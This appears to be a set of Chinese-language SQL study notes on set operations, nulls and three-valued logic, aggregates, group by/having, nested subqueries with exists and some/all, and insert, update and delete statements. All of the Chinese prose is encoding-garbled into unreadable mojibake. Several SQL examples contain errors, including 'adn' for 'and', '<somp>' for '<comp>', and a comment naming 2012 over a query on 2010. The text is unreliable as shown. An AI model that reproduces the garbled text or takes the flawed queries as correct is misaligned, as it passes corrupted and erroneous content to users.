æŒ‰ç…§å­—å…¸é¡ºåºè¿›è¡Œæ¯”è¾ƒ # ä¾‹å¦‚ (a1,a2)\u003c=(b1,b2) === (a1\u003cb1)or ((a1=b1) and (a2\u003c=b2))    é‡å¤   å¯¹äºå­˜åœ¨é‡å¤å…ƒç»„çš„å…³ç³»ï¼ŒSQL å¯ä»¥å†³å®šåœ¨ç»“æœä¸­æ˜¾ç¤ºè¯¥å…ƒç»„çš„å‡ ä¸ªå‰¯æœ¬\n  ä¸€äº›å…³ç³»ä»£æ•°è¿ç®—çš„å¤šé‡é›†ç‰ˆæœ¬â€”â€”ç»™å®šå¤šé‡é›†å…³ç³»r1 å’Œr2 ï¼š\n ÏƒÎ¸ (r1)ï¼šå¦‚æœå…³ç³»r1çš„å…ƒç»„t1æœ‰c1ä¸ªå‰¯æœ¬ï¼Œå¹¶ä¸”t1æ»¡è¶³é€‰æ‹©æ¡ä»¶ÏƒÎ¸ ï¼Œåˆ™åœ¨ ÏƒÎ¸ é‡Œæœ‰c1ä¸ªt1çš„å‰¯æœ¬ Î A (r)ï¼šå¯¹äºå…³ç³»r1çš„æ¯ä¸ªå…ƒç»„t1çš„æ¯ä¸ªå‰¯æœ¬ï¼Œåœ¨Î A (r1)é‡Œéƒ½æœ‰ä¸€ä¸ªå‰¯æœ¬Î A (t1) ï¼ŒÎ A (t1)æ˜¯r1ä¸­ç›¸åº”å‰¯æœ¬t1çš„æŠ•å½± r1 x r2ï¼šå¦‚æœå…³ç³»r1çš„å…ƒç»„t1æœ‰c1ä¸ªå‰¯æœ¬ï¼Œå…³ç³»r2çš„å…ƒç»„t2æœ‰c2ä¸ªå‰¯æœ¬ï¼Œåˆ™å…³ç³»r1 x r2çš„å…ƒç»„t1ï¼Œt2æœ‰c1 x c2ä¸ªå‰¯æœ¬    é›†åˆè¿ç®— é›†åˆè¿ç®—unionï¼Œintersectå’Œexceptï¼Œæ¯ä¸ªè¿ç®—éƒ½è‡ªåŠ¨å»é‡\nunionï¼šå¹¶é›†ï¼›intersectï¼šäº¤é›†ï¼›exceptï¼šå·®é›†(åœ¨Oracleä¸­ï¼Œæ˜¯minus)ï¼›\nå¦‚æœè¦ä¿ç•™é‡å¤ï¼Œåˆ™è¦ä½¿ç”¨å¯¹åº”çš„å¤šé‡é›†ç‰ˆæœ¬union allï¼Œintersect allï¼Œexcept all\n å¦‚æœä¸€ä¸ªå…ƒç»„åœ¨rä¸­å‡ºç°mæ¬¡ï¼Œåœ¨sä¸­å‡ºç°næ¬¡ï¼Œé‚£ä¹ˆï¼š\n r union all sï¼šm+næ¬¡ r intersect all sï¼šmin(m,n)æ¬¡ r except all sï¼šmax(0,m-n)æ¬¡   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  # ä¾‹ # æ‰¾å‡ºåœ¨2009å¹´ç§‹å­£å¼€è¯¾ï¼Œæˆ–è€…åœ¨2010å¹´æ˜¥å­£å¼€è¯¾ï¼Œæˆ–ä¸¤ä¸ªå­¦æœŸéƒ½å¼€è¯¾çš„æ‰€æœ‰è¯¾ç¨‹ (select course_id from section where sem = â€˜Fallâ€™ and year = 2009) union(select course_id from section where sem = â€˜Springâ€™ and year = 2010) # æ‰¾å‡ºåœ¨2009å¹´ç§‹å­£å’Œ2010å¹´æ˜¥å­£éƒ½å¼€è¯¾çš„æ‰€æœ‰è¯¾ç¨‹ (select course_id from section where sem = â€˜Fallâ€™ and year = 2009) intersect(select course_id from section where sem = â€˜Springâ€™ and year = 2010) # æ‰¾å‡ºåœ¨2009å¹´ç§‹å­£å­¦æœŸå¼€è¯¾ä½†ä¸åœ¨2010å¹´æ˜¥å­£å­¦æœŸå¼€è¯¾çš„æ‰€æœ‰è¯¾ç¨‹ (select course_id from section where sem = â€˜Fallâ€™ and year = 2009) except/minus(select course_id from section where sem = â€˜Springâ€™ and year = 2010)   ç©ºå€¼ å…ƒç»„çš„ä¸€äº›å±æ€§å¯ä»¥ä¸ºç©ºå€¼ï¼Œç”¨nullè¡¨ç¤º\nnullä»£è¡¨ä¸€ä¸ªä¸çŸ¥é“æˆ–ä¸å­˜åœ¨çš„å€¼\nåŒ…å«nullçš„ä»»ä½•ç®—æœ¯è¡¨è¾¾å¼çš„è®¡ç®—ç»“æœæ˜¯nullï¼Œæ¯”å¦‚5+null = null\nè°“è¯ï¼šis nullå¯ä»¥ç”¨æ¥æ£€æµ‹ç©ºå€¼ï¼Œä½†æ˜¯ä¸èƒ½å†™ `var = null\nå¸¦æœ‰nullçš„ä»»ä½•æ¯”è¾ƒè¿ç®—è¿”å› unknownï¼Œæ¯”å¦‚5\u003cnull := unknownï¼Œnull\u003c\u003enull := unknownï¼Œnull = null := unknown\nä¸‰å€¼é€»è¾‘ä½¿ç”¨çœŸå€¼unknown\n orï¼š(unknown or true) = trueï¼Œ(unknown or false) = unknownï¼Œ(unknown or unknown) = unknown andï¼š(unknown and true) = unknownï¼Œ(unknown and false) = falsesï¼Œ(unknown and unknown) = unknown notï¼šnot unknown = unknown è‹¥è°“è¯Pçš„å€¼ä¸ºunknownï¼Œåˆ™P is unknown = true  whereå­å¥ä¸­è°“è¯å¯¹ä¸€ä¸ªå…ƒç»„è®¡ç®—å‡ºçš„å€¼å¦‚æœä¸ºunknownï¼Œåˆ™ç»“æœå½“falseå¤„ç†\nèšé›†å‡½æ•° èšé›†å‡½æ•°ä»¥ä¸€ä¸ªå€¼çš„é›†åˆï¼ˆé›†æˆ–å¤šé‡é›†ï¼‰ä¸ºè¾“å…¥ï¼Œè¿”å›å•ä¸ªå€¼\n  avgï¼šå¹³å‡å€¼ minï¼šæœ€å°å€¼ maxï¼šæœ€å¤§å€¼ sumï¼šæ€»å’Œ countï¼šè®¡æ•°   èšé›†å‡½æ•°çš„æ€§è´¨åŒå…³ç³»ä»£æ•°ï¼šâ‘ èšé›†å‡½æ•°ä½œç”¨åŸŸé›†åˆï¼ˆå¤šé‡é›†ï¼‰è¿”å›å•å€¼ï¼›â‘¡èšé›†å‡½æ•°ä½œç”¨é»˜è®¤ä½œç”¨äºå¤šé‡é›†ï¼›â‘¢å¼ºåˆ¶ä½œç”¨äºé›†åˆï¼Œä½¿ç”¨distinctã€‚\nï¼ˆæ— åˆ†ç»„ï¼‰ä»…ç”¨èšé›†å‡½æ•°çš„SQLï¼šSQLè¿”å›å…³ç³»ï¼Œè¿”å›çš„å…³ç³»æœ‰ä¸”åªæœ‰ä¸€è¡Œï¼›Selectå­å¥ä¸­å‡ºç°èšé›†å‡½æ•°ï¼Œä¸èƒ½åŒæ—¶å‡ºç°éèšé›†çš„å±æ€§\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  # ä¾‹ # æ‰¾å‡ºComputer Scienceç³»æ•™å¸ˆçš„å¹³å‡å·¥èµ„ select avg(salary) from instructor where dept_name = 'Computer Science' # æ‰¾å‡ºåœ¨2012å¹´æ˜¥å­£å­¦æœŸè®²æˆçš„è¯¾ç¨‹çš„æ•™å¸ˆæ€»æ•° select count(distinct ID) from teacher where semester = 'Spring' and year = 2010 # æ‰¾å‡ºcourseå…³ç³»ä¸­çš„å…ƒç»„æ•° select count(*) from course   group byå­å¥ åœ¨å…³ç³»å­é›†ä¸Šè¿ç”¨èšé›†å‡½æ•°ï¼Œå¾—åˆ°ä¸€ä¸ªæ–°çš„å…³ç³»\ngroup byå­å¥çš„ä½œç”¨å¯¹è±¡æ˜¯æŸ¥è¯¢çš„ä¸­é—´ç»“æœè¡¨\nåˆ†ç»„æ–¹æ³•ï¼šæŒ‰æŒ‡å®šä¸€åˆ—æˆ–å¤šåˆ—å€¼åˆ†ç»„ï¼Œå€¼ç›¸ç­‰ä¸ºä¸€ç»„\nä½¿ç”¨Group by å­å¥åï¼ŒSelectå­å¥çš„åˆ—ååˆ—è¡¨ä¸­åªèƒ½å‡ºç°åˆ†ç»„å±æ€§å’Œèšé›†å‡½æ•°ï¼Œä¸èƒ½å‡ºç°éèšé›†çš„éåˆ†ç»„å±æ€§\nåˆ†ç»„èšé›†è®¡ç®—æ—¶ï¼ŒSQLè¿”å›å…³ç³»ï¼Œæ¯ç»„å¯¹åº”ä¸€è¡Œï¼Œæ— ç»„æ—¶è¿”å›ç©ºå…³ç³»\n1 2 3 4 5  # ä¾‹ # è®¡ç®—æ¯ä¸ªç³»çš„æ•™å¸ˆçš„å¹³å‡å·¥èµ„,deptâ€”â€”nameä¸ºç³»å select dept_name, avg(salary) from instructor group by dept_name;   havingå­å¥ havingæ˜¯å¯¹åˆ†ç»„èšé›†ç»“æœè¿›è¡Œé€‰æ‹©ï¼Œä¸æ»¡è¶³æ¡ä»¶çš„èˆå¼ƒ\nhavingå­å¥çš„è°“è¯åœ¨å½¢æˆåˆ†ç»„åèµ·ä½œç”¨ï¼Œwhereå­å¥ä¸­çš„è°“è¯åœ¨åˆ†ç»„ä¹‹å‰èµ·ä½œç”¨\n1 2 3 4  select dept_name,avg(salary) from instructor group by dept_name having avg(salary)\u003e42000   ç©ºå€¼å’Œèšé›†  é™¤äº†count(*)ï¼Œæ‰€æœ‰å…¶ä»–çš„èšé›†è¿ç®—éƒ½å¿½ç•¥èšé›†å±æ€§ä¸Šä¸ºç©ºå€¼çš„å…ƒç»„ å¦‚æœé›†åˆåªæœ‰ç©ºå€¼ï¼ˆè¾“å…¥å€¼é›†åˆä¸ºç©ºé›†ï¼‰ï¼Œåˆ™count(*)è¿ç®—å€¼ä¸º0ï¼Œå…¶ä»–æ‰€æœ‰çš„è¿ç®—è¿”å›ç©ºå€¼  1 2 3 4 5  # è®¡ç®—æ‰€æœ‰å·¥èµ„æ€»é¢çš„æŸ¥è¯¢ # è¯¥è¯­å¥å¿½ç•¥äº†ç©ºå€¼,è‹¥æ²¡æœ‰éç©ºçš„salary,åˆ™ç»“æœä¸ºnull select\tsum(salary) from\tinstructor   åµŒå¥—å­æŸ¥è¯¢ SQLæä¾›äº†ä¸€ä¸ªå­æŸ¥è¯¢åµŒå¥—çš„æœºåˆ¶\nä¸€ä¸ªå­æŸ¥è¯¢æ˜¯ä¸€ä¸ªåµŒå¥—åœ¨å…¶ä»–çš„æŸ¥è¯¢ä¸­çš„select-from-whereè¡¨è¾¾å¼\nå­æŸ¥è¯¢é€šå¸¸ç”¨äºå¯¹é›†åˆæˆå‘˜çš„èµ„æ ¼ã€é›†åˆçš„æ¯”è¾ƒã€é›†åˆçš„åŸºæ•°è¿›è¡Œæ£€æŸ¥\n é›†åˆæˆå‘˜çš„èµ„æ ¼ï¼šin\né›†åˆä¹‹é—´çš„æ¯”è¾ƒï¼šÎ¸\næµ‹è¯•é›†åˆæ˜¯å¦ä¸ºç©ºï¼šexists\næµ‹è¯•é›†åˆæ˜¯å¦å­˜åœ¨é‡å¤å…ƒç»„ï¼šunique\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  # ä¾‹ # æ‰¾å‡ºåœ¨2009å¹´ç§‹å­£å’Œ2010å¹´æ˜¥å­£åŒæ—¶å¼€è¯¾çš„æ‰€æœ‰è¯¾ç¨‹ select distinct\tcourse_id from\tsection where\tsemester = 'Fall' and year = 2009 adn course_id in (select course_id from section where semester = 'Spring' and year = 2010); # æ‰¾å‡ºåœ¨2009å¹´çƒå­£å­¦æœŸå¼€è¯¾ä½†ä¸åœ¨2010å¹´æ˜¥å­£å­¦æœŸå¼€è¯¾çš„æ‰€æœ‰è¯¾ç¨‹ select\tdistinct\tcourse_id from section where\tsemester = 'Fall' and year = 2009 and course_id not in (select course_id from section where semester = 'Spring' and year = 2010); # æ‰¾å‡ºï¼ˆä¸åŒçš„ï¼‰å­¦ç”Ÿæ€»æ•°ï¼Œä»–ä»¬é€‰ä¿®äº†IDä¸º10101çš„æ•™å¸ˆæ‰€è®²æˆçš„è¯¾ç¨‹ select count (distinct ID) from takes where (course_id, sec_id, semester, year) in (select course_id, sec_id, semester, year from teaches where teaches.ID= 10101); ------ # æ‰¾å‡ºæ»¡è¶³ä¸‹é¢æ¡ä»¶çš„æ‰€æœ‰æ•™å¸ˆçš„å§“åï¼Œä»–ä»¬çš„å·¥èµ„è‡³å°‘æ¯”Biologyç³»æŸä¸€ä¸ªæ•™å¸ˆçš„å·¥èµ„è¦é«˜ select distinct T.name from instructor as T, instructor as S where T.salary \u003e S.salary and S.dept_name = â€™Biologyâ€™; # æœ‰äº›æŸ¥è¯¢ä½¿ç”¨ \u003esome å­å¥ select name from instructor where salary \u003e some (select salary from instructor where dept_name = â€™Biologyâ€™);   someï¼Œanyï¼Œallå­å¥ F \u003ccomp\u003e some r â‡” âˆƒ t âˆˆ r ä½¿å¾—( F \u003ccomp\u003e t )ï¼Œå…¶ä¸­\u003ccomp\u003eå¯ä»¥æ˜¯\u003c,\u003c=,\u003e,\u003e=,\u003c\u003e\n(= some) â‰¡ in\n  ALL çˆ¶æŸ¥è¯¢ä¸­çš„ç»“æœé›†å¤§äºå­æŸ¥è¯¢ä¸­æ¯ä¸€ä¸ªç»“æœé›†ä¸­çš„å€¼,åˆ™ä¸ºçœŸ\n  ANY,SOME çˆ¶æŸ¥è¯¢ä¸­çš„ç»“æœé›†å¤§äºå­æŸ¥è¯¢ä¸­ä»»æ„ä¸€ä¸ªç»“æœé›†ä¸­çš„å€¼,åˆ™ä¸ºçœŸ\n   Allï¼šåªæœ‰å½“å…¶æ‰€æœ‰æ•°æ®éƒ½æ»¡è¶³æ¡ä»¶æ—¶ï¼Œæ¡ä»¶æ‰æˆç«‹ Anyï¼šåªè¦æœ‰ä¸€æ¡æ•°æ®æ»¡è¶³æ¡ä»¶ï¼Œæ¡ä»¶å°±æˆç«‹ Someï¼šå…¶ä¸­å­˜åœ¨ä¸€äº›æ•°æ®æ»¡è¶³æ¡ä»¶ï¼Œä½œç”¨å’ŒAnyå¤§è‡´ç›¸åŒ å¸¸è§„çš„ä½¿ç”¨ä¸­çœ‹ä½œä¸€è‡´å³å¯\n F \u003ccomp\u003e all r â‡” âˆ€ t âˆˆ rï¼ˆF \u003csomp\u003e tï¼‰\n(â‰  all) â‰¡ not in\n someå’Œallè°“è¯å¯ä»¥ç”¨èšé›†å‡½æ•°å®ç°      = \u003c\u003eæˆ–!= \u003c \u003c= \u003e \u003e=     some in -- \u003cmax \u003c=max \u003emin \u003e=min   all -- not in \u003cmin \u003c=min \u003emax \u003e=max    ç©ºå…³ç³»æµ‹è¯• existsç»“æ„æµ‹è¯•å­æŸ¥è¯¢ç»“æœæ˜¯å¦æœ‰å…ƒç»„ï¼Œå­æŸ¥è¯¢éç©ºçš„æ—¶å€™ï¼Œè¿”å›true\nexists r â‡” r â‰  Î¦\nnot exists r â‡” r = Î¦\nexistsè°“è¯  å­˜åœ¨é‡è¯âˆƒ å¸¦æœ‰existsè°“è¯çš„å­æŸ¥è¯¢ä¸è¿”å›ä»»ä½•æ•°æ®ï¼Œåªäº§ç”Ÿé€»è¾‘çœŸå€¼trueæˆ–é€»è¾‘å‡å€¼false  è‹¥å†…å±‚æŸ¥è¯¢ç»“æœéç©ºï¼Œåˆ™è¿”å›çœŸå€¼ è‹¥å†…å±‚æŸ¥è¯¢ç»“æœä¸ºç©ºï¼Œåˆ™è¿”å›å‡å€¼   ç”±existså¼•å‡ºçš„å­æŸ¥è¯¢ï¼Œå…¶ç›®æ ‡åˆ—è¡¨è¾¾å¼é€šå¸¸éƒ½ç”¨*ï¼Œå› ä¸ºå¸¦existsçš„å­æŸ¥è¯¢åªè¿”å›çœŸå€¼æˆ–å‡å€¼ï¼Œç»™å‡ºåˆ—åæ— å®é™…æ„ä¹‰  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  # ä¾‹ # å¦ä¸€ç§è¡¨è¿°æŸ¥è¯¢â€œæ‰¾å‡ºåœ¨2009å¹´ç§‹å­£å’Œ2010å¹´æ˜¥å­£åŒæ—¶å¼€è¯¾çš„æ‰€æœ‰è¯¾ç¨‹çš„é›†åˆâ€çš„æ–¹å¼ select course_id from section S where semester = â€™Fallâ€™ and year= 2009 and exists (select * from section as T where semester=â€™Springâ€™and year=2010 and S.course_id= T.course_id); # 2 select course_id from section where semester = â€™Fallâ€™ and year= 2009 and course_id in (select course_id from section where semester=â€™Springâ€™and year=2010);    ç›¸å…³å­æŸ¥è¯¢ï¼šinåçš„å­æŸ¥è¯¢ä¸å¤–å±‚æŸ¥è¯¢æ— å…³ï¼Œæ¯ä¸ªå­æŸ¥è¯¢æ‰§è¡Œä¸€æ¬¡ï¼Œè€Œexistsåçš„å­æŸ¥è¯¢ä¸å¤–å±‚æŸ¥è¯¢æœ‰å…³ï¼Œéœ€è¦æ‰§è¡Œå¤šæ¬¡ï¼Œç§°ä¹‹ä¸ºç›¸å…³å­æŸ¥è¯¢  æ‰§è¡Œè¿‡ç¨‹ï¼š  é¦–å…ˆå–å¤–å±‚æŸ¥è¯¢ä¸­è¡¨çš„ç¬¬ä¸€ä¸ªå…ƒç»„ï¼Œæ ¹æ®å®ƒä¸å†…å±‚æŸ¥è¯¢ç›¸å…³çš„å±æ€§å€¼å¤„ç†å†…å±‚æŸ¥è¯¢ï¼Œè‹¥WHEREå­å¥è¿”å›å€¼ä¸ºçœŸï¼Œåˆ™å–æ­¤å…ƒç»„æ”¾å…¥ç»“æœè¡¨ ç„¶åå†å–å¤–å±‚è¡¨çš„ä¸‹ä¸€ä¸ªå…ƒç»„ é‡å¤è¿™ä¸€è¿‡ç¨‹ï¼Œç›´è‡³å¤–å±‚è¡¨å…¨éƒ¨æ£€æŸ¥å®Œä¸ºæ­¢      sqlä¸­å…¨éƒ¨æ¦‚å¿µçš„å¤„ç† å…¨éƒ¨åœ¨sqlä¸­çš„ä¸‰ç§å†™æ³•\n âˆ€ï¼šnot exists(not exists) è¶…é›†supersetï¼šnot exists(X except Y) Ã·ï¼šnot in(not in)    ç”¨EXISTSè¡¨ç¤ºè¶…é›†  è‹¥Aä¸ºBçš„è¶…é›†ï¼Œåˆ™NOT EXISTS (B EXCEPT A) ä¸ºTRUE å¯¹äºB EXCEPT Aï¼Œå¯ä»¥è¡¨è¾¾ä¸ºï¼šåœ¨Bä¸­å­˜åœ¨ï¼Œä½†åœ¨Aä¸­ä¸å­˜åœ¨çš„è®°å½•ï¼Œä¹Ÿå¯ä»¥ç”¨NOT EXISTS æ¥è¡¨è¾¾ å› æ­¤è¶…é›†å¯ä»¥ç”¨ä¸¤ä¸ªNOT EXISTS çš„åµŒå¥—æ¥è¡¨è¾¾ï¼Œä¹Ÿå¯ä»¥ç”¨ä¸¤ä¸ªNOT IN çš„åµŒå¥—æ¥è¡¨è¾¾     å·§ç”¨é€†å¦å‘½é¢˜çš„ç­‰ä»·\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  # ä¾‹ # åˆ—å‡ºé€‰ä¿®äº†å…¨éƒ¨è¯¾ç¨‹çš„å­¦ç”Ÿå§“å  # ä»»æ„è¯¾ç¨‹ï¼Œæ‰€æ±‚å­¦ç”Ÿé€‰ä¹‹â‡”ä¸å­˜åœ¨ä»»ä½•ä¸€é—¨è¯¾ç¨‹ï¼Œæ‰€æ±‚å­¦ç”Ÿæ²¡æœ‰é€‰ä¹‹ select\tSNAME from\tS where\tnot exists(select Cno from C where not exists(select * from SC where SC.Cno = C.Cno and SC.Sno = S.Sno)) # ä»»æ„è¯¾ç¨‹ï¼Œæ‰€æ±‚å­¦ç”Ÿé€‰ä¹‹â‡”æ‰€æ±‚å­¦ç”Ÿçš„é€‰è¯¾é›†åˆä¸ºæ‰€æœ‰è¯¾ç¨‹é›†åˆçš„è¶…é›† select\tSNAME from\tS where\tnot exists((select\tCno from\tC) except (select Cno from\tSC where\tSC.Sno = S.Sno)) #ä»»æ„è¯¾ç¨‹ï¼Œæ‰€æ±‚å­¦ç”Ÿé€‰ä¹‹â‡”æ‰€æ±‚å­¦ç”Ÿä¸åœ¨å¦‚ä¸‹é›†åˆä¸­ï¼šå­¦ç”Ÿå­¦å·ä¸ä»»ä¸€è¯¾ç¨‹çš„ç»„åˆä¸å…¨åŒ…å«åœ¨SC select\tSNAME from\tS where\tSno\tnot in (select\tSno from\tC,S where\t(Sno,Cno) not in (select Sno,Cno\tfrom SC))   æµ‹è¯•æ²¡æœ‰é‡å¤çš„å…ƒç»„ uniqueç»“æ„æµ‹è¯•ä¸€ä¸ªå­æŸ¥è¯¢çš„ç»“æœä¸­æ˜¯å¦æœ‰é‡å¤çš„å…ƒç»„ï¼Œåœ¨ç©ºé›†ä¸­å…¶å€¼ä¸ºtrue\n1 2 3 4 5 6 7 8  # ä¾‹ # æ‰¾å‡ºæ‰€æœ‰2009å¹´æœ€å¤šå¼€è®¾ä¸€æ¬¡çš„è¯¾ç¨‹ select T.course_id from course T where unique (select R.course_id from section R where T.course_id = R.course_id and R.year = 2009)   fromå­å¥ä¸­çš„å­æŸ¥è¯¢ sqlå…è®¸fromå­å¥ä¸­çš„å­æŸ¥è¯¢çš„è¡¨è¾¾å¼\n1 2 3 4 5 6 7 8  # ä¾‹ # æ‰¾å‡ºç³»å¹³å‡å·¥èµ„è¶…è¿‡42000ç¾å…ƒçš„é‚£äº›ç³»ä¸­æ•™å¸ˆçš„å¹³å‡å·¥èµ„ select dept_name, avg_salary from (select dept_name, avg (salary) avg_salary from instructor group by dept_name) where avg_salary \u003e 42000;   withå­å¥ withå­å¥æä¾›äº†å®šä¹‰ä¸´æ—¶å…³ç³»çš„æ–¹æ³•ï¼Œè¿™ä¸ªå®šä¹‰æ”¯é˜ŸåŒ…å«withçš„å­å¥çš„æŸ¥è¯¢æœ‰æ•ˆ\n1 2 3 4 5 6 7 8  # ä¾‹ # æ‰¾å‡ºå…·æœ‰æœ€å¤§é¢„ç®—å€¼çš„ç³» with max_budget (value) as (select max(budget) from department) select budget from department, max_budget where department.budget = max_budget.value;   withå­å¥åœ¨å†™å¤æ‚æŸ¥è¯¢æ—¶éå¸¸æœ‰ç”¨\næ ‡é‡å­æŸ¥è¯¢ SQLå…è®¸å­æŸ¥è¯¢å‡ºç°åœ¨è¿”å›å•ä¸ªå€¼çš„è¡¨è¾¾å¼èƒ½å¤Ÿå‡ºç°çš„ä»»ä½•åœ°æ–¹ï¼Œåªè¦è¯¥å­æŸ¥è¯¢åªè¿”å›åŒ…å«å•ä¸ªå±æ€§çš„å•ä¸ªå…ƒç»„ï¼›è¿™æ ·çš„å­æŸ¥è¯¢ç§°ä¸ºæ ‡é‡å­æŸ¥è¯¢ï¼ˆscalar subqueryï¼‰\næ ‡é‡å­æŸ¥è¯¢åªè¿”å›åŒ…å«å•ä¸ªå±æ€§çš„å•ä¸ªå…ƒç»„\nå¦‚æœå­æŸ¥è¯¢çš„ç»“æœè¿”å›å¤šä¸ªå…ƒç»„ï¼Œåˆ™ä¼šäº§ç”Ÿè¿è¡Œé”™è¯¯\næ•°æ®åº“çš„ä¿®æ”¹  ä»ä¸€ä¸ªç»™å®šçš„å…³ç³»ä¸­åˆ é™¤å…ƒç»„ï¼šdelete from å‘ä¸€ä¸ªç»™å®šçš„å…³ç³»æ’å…¥æ–°çš„å…ƒç»„ï¼šinsert into å°†ä¸€ä¸ªç»™å®šçš„å…³ç³»çš„ä¸€äº›å…ƒç»„çš„å€¼æ›´æ–°ï¼šupdate  åˆ é™¤ 1  delete\tfrom\ttable_name\t[where\t\u003cæ¡ä»¶è¡¨è¾¾å¼\u003e]   ä»è¡¨ä¸­åˆ é™¤ç¬¦åˆæ¡ä»¶çš„å…ƒç»„ï¼Œå¦‚æœæ²¡æœ‰whereè¯­å¥ï¼Œåˆ™åˆ é™¤æ‰€æœ‰å…ƒç»„\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  # ä¾‹ # åˆ é™¤ instructors å…³ç³»ä¸­çš„æ‰€æœ‰å…ƒç»„ delete\tfrom instructor # ä» instructors å…³ç³»ä¸­åˆ é™¤ä¸ Finance ç³»æ•™å¸ˆç›¸å…³çš„æ‰€æœ‰å…ƒç»„ delete\tfrom\tinstructor where\tdept_name = 'Finance' #ä» instructor å…³ç³»ä¸­åˆ é™¤åœ¨ä½äº Watson å¤§æ¥¼çš„ç³»å·¥ä½œçš„æ•™å¸ˆå…ƒç»„ delete\tfrom\tinstructor where\tdept_name\tin(select\tdept_name from\tdepartment where\tbuilding = 'Watson') # åˆ é™¤å·¥èµ„ä½äºå¤§å­¦å¹³å‡å·¥èµ„çš„æ•™å¸ˆè®°å½• delete\tfrom instructor where\tsalary\t\u003c (select\tavg(salary)\tfrom\tinstructor)   æ’å…¥ 1 2 3  insert\tinto\ttable_name\t[(col1 [,col2]...)] values\t(val1 [,val2]...)   æ’å…¥ä¸€æ¡æŒ‡å®šå¥½å€¼çš„å…ƒç»„\n1 2  insert\tinto\ttable_name\t[(col1 [,col2]...)] (å­æŸ¥è¯¢)   æ’å…¥å­æŸ¥è¯¢ç»“æœä¸­çš„è‹¥å¹²æ¡å…ƒç»„\nintoå­å¥  æŒ‡å®šè¦æ’å…¥æ•°æ®çš„è¡¨ååŠå±æ€§åˆ— å±æ€§åˆ—çš„é¡ºåºå¯ä»¥ä¸è¡¨å®šä¹‰ä¸­çš„é¡ºåºä¸ä¸€è‡´ æ²¡æœ‰æŒ‡å®šå±æ€§åˆ—ï¼šè¡¨ç¤ºè¦æ’å…¥çš„æ˜¯ä¸€æ¡å®Œæ•´çš„å…ƒç»„ï¼Œä¸”å±æ€§åˆ—å±æ€§ä¸è¡¨å®šä¹‰ä¸­çš„é¡ºåºä¸€è‡´ æŒ‡å®šéƒ¨åˆ†å±æ€§åˆ—ï¼šæ’å…¥çš„å…ƒç»„åœ¨å…¶ä½™å±æ€§åˆ—ä¸Šå–ç©ºå€¼  valueså­å¥  æä¾›çš„å€¼å¿…é¡»ä¸intoå­å¥åŒ¹é…ï¼šå€¼çš„ä¸ªæ•°\u0026\u0026å€¼çš„ç±»å‹  å­æŸ¥è¯¢  selectå­å¥ç›®æ ‡åˆ—å¿…é¡»ä¸intoå­å¥åŒ¹é…ï¼šå€¼çš„ä¸ªæ•°\u0026\u0026å€¼çš„ç±»å‹  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  # ä¾‹ # å‘ course å…³ç³»ä¸­æ’å…¥æ–°å…ƒç»„ insert into course values (â€˜CS-437â€™,â€˜Database Systemsâ€™,â€˜Comp. Sci.â€™, 4); insert into course (course_id, title, dept_name, credits) values (â€˜CS-437â€™, â€˜Database Systemsâ€™, â€˜Comp. Sci.â€™, 4); # å‘ student å…³ç³»ä¸­æ’å…¥æ–°å…ƒç»„ï¼Œå¹¶å°†tot_creds å±æ€§è®¾ç½®ä¸ºnull insert into student values (â€˜3003â€™, â€˜Greenâ€™, â€˜Financeâ€™, null); # å°†instructor å…³ç³»ä¸­çš„æ‰€æœ‰å…ƒç»„æ’å…¥åˆ°student å…³ç³»é‡Œï¼Œå¹¶å°†å±æ€§tol_creditsè®¾ç½®ä¸º0 insert into student select ID, name, dept_name, 0 from instructor    select from where è¯­å¥åœ¨å®ƒçš„ç»“æœè¢«æ’å…¥åˆ°ç›¸åº”çš„å…³ç³»ä¹‹å‰å°±å®Œæˆäº†è¯„ä¼°ï¼Œå¦åˆ™ï¼Œåƒè¿™æ ·çš„æŸ¥è¯¢ insert into table1 select * from table1ï¼Œå¦‚æœtable1æ²¡æœ‰ä¸»ç çš„è¯ï¼Œä¼šå‡ºç°é—®é¢˜  æ›´æ–° 1 2 3 4 5  update\ttable_name set\tcol_name1 = è¡¨è¾¾å¼|å­æŸ¥è¯¢ col_name2 = è¡¨è¾¾å¼|å­æŸ¥è¯¢ ... [where æ¡ä»¶è¡¨è¾¾å¼]   æŒ‡å®šå¯¹å“ªäº›åˆ—è¿›è¡Œæ›´æ–°ï¼Œä»¥åŠæ›´æ–°åçš„å€¼æ˜¯ä»€ä¹ˆ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  # ä¾‹ # è€å¸ˆå·¥èµ„ä¸Šè°ƒ5% update\tPROF set\tSAL = SAL * 1.05 #å°†d1ç³»çš„å­¦ç”Ÿå¹´é¾„å¢åŠ 1å² update\tStudent set\tS_age = S_age + 1 where dno = 'd1' # å°†d1ç³»å…¨ä½“å­¦ç”Ÿçš„æˆç»©ç½®é›¶ update SC set\tScore = 0 where 'd1' = (select dno from S where\tS.Sno = SC.Sno) # å°†D01ç³»ç³»ä¸»ä»»çš„å·¥èµ„æ”¹ä¸ºè¯¥ç³»çš„å¹³å‡å·¥èµ„ update PROF set\tSAL = (select avg(SAL) from\tPROF where\tDno = D01) where\tPno = (select\tDEAN from\tDEPT where\tDno = D01)   ä¸ºæ¡ä»¶æ›´æ–°ä½¿ç”¨Caseè¯­å¥ 1 2 3 4 5 6  # ä¾‹ update\tinstructor set\tsalary = case when\tsalary \u003c= 100000 then salary * 1.05 else\tsalary *1.03 end   ä½¿ç”¨æ ‡é‡å­æŸ¥è¯¢çš„æ›´æ–° 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  # ä¾‹ # ä¸ºå…³ç³»studenté‡æ–°è®¡ç®—å¹¶æ›´æ–°tot_creditå±æ€§çš„å€¼ update\tstudent S set\ttot_credit\t=\t(select\tsum(credits) from\ttakes\tnatural join course where\tS.ID = takes.ID and takes.grade \u003c\u003e 'F' and takes.grade\tis not null); # 